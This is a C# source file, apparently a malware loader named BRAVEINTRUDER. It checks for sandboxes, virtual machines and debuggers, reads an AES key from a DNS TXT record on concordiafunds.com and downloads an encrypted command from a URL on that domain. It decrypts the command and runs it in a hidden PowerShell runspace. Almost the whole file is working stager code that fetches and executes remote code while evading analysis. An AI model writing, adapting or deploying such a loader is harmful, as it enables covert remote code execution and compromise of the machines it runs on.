using System;
using System.IO;
using System.Resources;
using System.Collections.Generic;
using System.Security.Cryptography;
using System.Linq;
using System.Text;
using System.Net;
using Microsoft.Win32;
using System.Collections.ObjectModel;
using System.Management.Automation;
using System.Management.Automation.Runspaces;
using System.Diagnostics;
using System.Text.RegularExpressions;

namespace BRAVEINTRUDER
{
    class Program
    {
        static bool checkTimeZone()
        {
            if (TimeZone.CurrentTimeZone.StandardName == "Coordinated Universal Time")
            {
                return false;
            }
            else
            {
                return true;
            }
        }

        static bool checkVMRegistryKeys()
        {
            List<string> EvidenceOfSandbox = new List<string>();

            List<string> sandboxStrings = new List<string> { "vmware", "virtualbox", "vbox", "qemu", "xen" };

            string[] HKLM_Keys_To_Check_Exist = {@"HARDWARE\DEVICEMAP\Scsi\Scsi Port 2\Scsi Bus 0\Target Id 0\Logical Unit Id 0\Identifier",
                @"SYSTEM\CurrentControlSet\Enum\SCSI\Disk&Ven_VMware_&Prod_VMware_Virtual_S",
                @"SYSTEM\CurrentControlSet\Control\CriticalDeviceDatabase\root#vmwvmcihostdev",
                @"SYSTEM\CurrentControlSet\Control\VirtualDeviceDrivers",
                @"SOFTWARE\VMWare, Inc.\VMWare Tools",
                @"SOFTWARE\Oracle\VirtualBox Guest Additions",
                @"HARDWARE\ACPI\DSDT\VBOX_"};

            string[] HKLM_Keys_With_Values_To_Parse = {@"SYSTEM\ControlSet001\Services\Disk\Enum\0",
                @"HARDWARE\Description\System\SystemBiosInformation",
                @"HARDWARE\Description\System\VideoBiosVersion",
                @"HARDWARE\Description\System\SystemManufacturer",
                @"HARDWARE\Description\System\SystemProductName",
                @"HARDWARE\Description\System\Logical Unit Id 0"};

            foreach (string HKLM_Key in HKLM_Keys_To_Check_Exist)
            {
                RegistryKey OpenedKey = Registry.LocalMachine.OpenSubKey(HKLM_Key, false);
                if (OpenedKey != null)
                {
                    EvidenceOfSandbox.Add(@"HKLM:\" + HKLM_Key);
                }
            }

            foreach (string HKLM_Key in HKLM_Keys_With_Values_To_Parse)
            {
                string valueName = new DirectoryInfo(HKLM_Key).Name;
                string value = (string)Registry.LocalMachine.OpenSubKey(Path.GetDirectoryName(HKLM_Key), false).GetValue(valueName);
                foreach (string sandboxString in sandboxStrings)
                {
                    if (!string.IsNullOrEmpty(value) && value.ToLower().Contains(sandboxString.ToLower()))
                    {
                        EvidenceOfSandbox.Add(@"HKLM:\" + HKLM_Key + " => " + value);
                    }
                }
            }
            return EvidenceOfSandbox.Count == 0;
        }

        static bool checkVMFilePaths()
        {
            List<string> EvidenceOfSandbox = new List<string>();
            string[] FilePaths = {@"C:\windows\Sysnative\Drivers\Vmmouse.sys",
        @"C:\windows\Sysnative\Drivers\vm3dgl.dll", @"C:\windows\Sysnative\Drivers\vmdum.dll",
        @"C:\windows\Sysnative\Drivers\vm3dver.dll", @"C:\windows\Sysnative\Drivers\vmtray.dll",
        @"C:\windows\Sysnative\Drivers\vmci.sys", @"C:\windows\Sysnative\Drivers\vmusbmouse.sys",
        @"C:\windows\Sysnative\Drivers\vmx_svga.sys", @"C:\windows\Sysnative\Drivers\vmxnet.sys",
        @"C:\windows\Sysnative\Drivers\VMToolsHook.dll", @"C:\windows\Sysnative\Drivers\vmhgfs.dll",
        @"C:\windows\Sysnative\Drivers\vmmousever.dll", @"C:\windows\Sysnative\Drivers\vmGuestLib.dll",
        @"C:\windows\Sysnative\Drivers\VmGuestLibJava.dll", @"C:\windows\Sysnative\Drivers\vmscsi.sys",
        @"C:\windows\Sysnative\Drivers\VBoxMouse.sys", @"C:\windows\Sysnative\Drivers\VBoxGuest.sys",
        @"C:\windows\Sysnative\Drivers\VBoxSF.sys", @"C:\windows\Sysnative\Drivers\VBoxVideo.sys",
        @"C:\windows\Sysnative\vboxdisp.dll", @"C:\windows\Sysnative\vboxhook.dll",
        @"C:\windows\Sysnative\vboxmrxnp.dll", @"C:\windows\Sysnative\vboxogl.dll",
        @"C:\windows\Sysnative\vboxoglarrayspu.dll", @"C:\windows\Sysnative\vboxoglcrutil.dll",
        @"C:\windows\Sysnative\vboxoglerrorspu.dll", @"C:\windows\Sysnative\vboxoglfeedbackspu.dll",
        @"C:\windows\Sysnative\vboxoglpackspu.dll", @"C:\windows\Sysnative\vboxoglpassthroughspu.dll",
        @"C:\windows\Sysnative\vboxservice.exe", @"C:\windows\Sysnative\vboxtray.exe",
        @"C:\windows\Sysnative\VBoxControl.exe"};
            foreach (string FilePath in FilePaths)
            {
                if (File.Exists(FilePath))
                {
                    EvidenceOfSandbox.Add(FilePath);
                }
            }

            return EvidenceOfSandbox.Count == 0;
        }

        static bool checkProcessorCount()
        {
            return System.Environment.ProcessorCount > 1;
        }

        static bool checkDebugger()
        {
            return System.Diagnostics.Debugger.IsAttached;
        }

        static bool checkOfficeInstall()
        {
            List<string> EvidenceOfOffice = new List<string>();
            string[] FilePaths = {  @"C:\Program Files\Microsoft Office\Office12\excel.exe",
                                    @"C:\Program Files (x86)\Microsoft Office\Office12\excel.exe",
                                    @"C:\Program Files\Microsoft Office\Office14\excel.exe",
                                    @"C:\Program Files (x86)\Microsoft Office\Office14\excel.exe",
                                    @"C:\Program Files\Microsoft Office\Office15\excel.exe",
                                    @"C:\Program Files (x86)\Microsoft Office\Office15\excel.exe",
                                    @"C:\Program Files\Microsoft Office\Office16\excel.exe",
                                    @"C:\Program Files (x86)\Microsoft Office\Office16\excel.exe",
                                    @"C:\Program Files\Microsoft Office\Office12\winword.exe",
                                    @"C:\Program Files (x86)\Microsoft Office\Office12\winword.exe",
                                    @"C:\Program Files\Microsoft Office\Office14\winword.exe",
                                    @"C:\Program Files (x86)\Microsoft Office\Office14\winword.exe",
                                    @"C:\Program Files\Microsoft Office\Office15\winword.exe",
                                    @"C:\Program Files (x86)\Microsoft Office\Office15\winword.exe",
                                    @"C:\Program Files\Microsoft Office\Office16\winword.exe",
                                    @"C:\Program Files (x86)\Microsoft Office\Office16\winword.exe"};
            foreach (string FilePath in FilePaths)
            {
                if (File.Exists(FilePath))
                {
                    EvidenceOfOffice.Add(FilePath);
                }
            }

            return EvidenceOfOffice.Count >= 1;
        }

        static void izSafe()
        {
            if (!checkTimeZone())
            {
                Environment.Exit(0);
            }

            if (!checkProcessorCount())
            {
                Environment.Exit(0);
            }

            if (!checkDebugger())
            {
                Environment.Exit(0);
            }

            return;

            if (!checkOfficeInstall())
            {
                Environment.Exit(0);
            }

            if (!checkVMFilePaths())
            {
                Environment.Exit(0);
            }

            if (!checkVMRegistryKeys())
            {
                Environment.Exit(0);
            }
        }

        //SharpPick
        static string DoFunStuff(string cmd)
        {
            //Init stuff
            Runspace runspace = RunspaceFactory.CreateRunspace();
            runspace.Open();
            RunspaceInvoke scriptInvoker = new RunspaceInvoke(runspace);
            Pipeline pipeline = runspace.CreatePipeline();

            //Add commands
            pipeline.Commands.AddScript(cmd);

            //Prep PS for string output and invoke
            pipeline.Commands.Add("Out-String");
            Collection<PSObject> results = pipeline.Invoke();
            runspace.Close();

            //Convert records to strings
            StringBuilder stringBuilder = new StringBuilder();
            foreach (PSObject obj in results)
            {
                stringBuilder.Append(obj);
            }
            return stringBuilder.ToString().Trim();
        }

        // stolen from https://stackoverflow.com/questions/273452/using-aes-encryption-in-c-sharp
        static string decrypt(byte[] cipherText, byte[] Key, byte[] IV)
        {
            // Check arguments. 
            if (cipherText == null || cipherText.Length <= 0)
                throw new ArgumentNullException("cipherText");
            if (Key == null || Key.Length <= 0)
                throw new ArgumentNullException("Key");
            if (IV == null || IV.Length <= 0)
                throw new ArgumentNullException("IV");

            // Declare the string used to hold 
            // the decrypted text. 
            string plaintext = null;

            // Create an RijndaelManaged object 
            // with the specified key and IV. 
            using (RijndaelManaged rijAlg = new RijndaelManaged())
            {
                rijAlg.Key = Key;
                rijAlg.IV = IV;

                // Create a decrytor to perform the stream transform.
                ICryptoTransform decryptor = rijAlg.CreateDecryptor(rijAlg.Key, rijAlg.IV);

                // Create the streams used for decryption. 
                using (MemoryStream msDecrypt = new MemoryStream(cipherText))
                {
                    using (CryptoStream csDecrypt = new CryptoStream(msDecrypt, decryptor, CryptoStreamMode.Read))
                    {
                        using (StreamReader srDecrypt = new StreamReader(csDecrypt))
                        {

                            // Read the decrypted bytes from the decrypting stream 
                            // and place them in a string.
                            plaintext = srDecrypt.ReadToEnd();
                        }
                    }
                }
            }
            return plaintext;
        }

        // stolen fron http://www.robertsindall.co.uk/blog/blog/2011/05/09/getting-dns-txt-record-using-c-sharp/
        static IList<string> getTXTrecords(string domain)
        {
            IList<string> txtRecords = new List<string>();
            string output;
            string pattern = string.Format(@"{0}\s*text =\s*""([\w\-\=]*)""", domain);
            var getKey = new ProcessStartInfo("nslookup");
            getKey.Arguments = string.Format("-type=TXT {0}", domain);
            getKey.RedirectStandardOutput = true;
            getKey.UseShellExecute = false;
            getKey.WindowStyle = ProcessWindowStyle.Hidden;
            using (var nslookupProcess = Process.Start(getKey))
            {
                output = nslookupProcess.StandardOutput.ReadToEnd();
            }

            var matches = Regex.Matches(output, pattern, RegexOptions.IgnoreCase);
            foreach (Match match in matches)
            {
                if (match.Success)
                    txtRecords.Add(match.Groups[1].Value);
            }

            return txtRecords;
        }

        // stolen from https://stackoverflow.com/questions/27108264/c-sharp-how-to-properly-make-a-http-web-get-request
        static string HttpGet(string URI)
        {
            WebClient client = new WebClient();

            // Add a user agent header in case the 
            // requested URI contains a query.

            client.Headers.Add("user-agent", "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2; .NET CLR 1.0.3705;)");

            Stream data = client.OpenRead(URI);
            StreamReader reader = new StreamReader(data);
            string s = reader.ReadToEnd();
            data.Close();
            reader.Close();

            return s;
        }

        static void Main()
        {

            izSafe();

            byte[] key = Encoding.ASCII.GetBytes(getTXTrecords("ede2db6.concordiafunds.com")[0]);

            string data = HttpGet("https://secured.concordiafunds.com/test1.txt");
            byte[] iv = Convert.FromBase64String(data.Split(':')[0]);
            byte[] encryptedCmd = Convert.FromBase64String(data.Split(':')[1]);

            string cmd = decrypt(encryptedCmd, key, iv);

            DoFunStuff(cmd);
        }
    }
}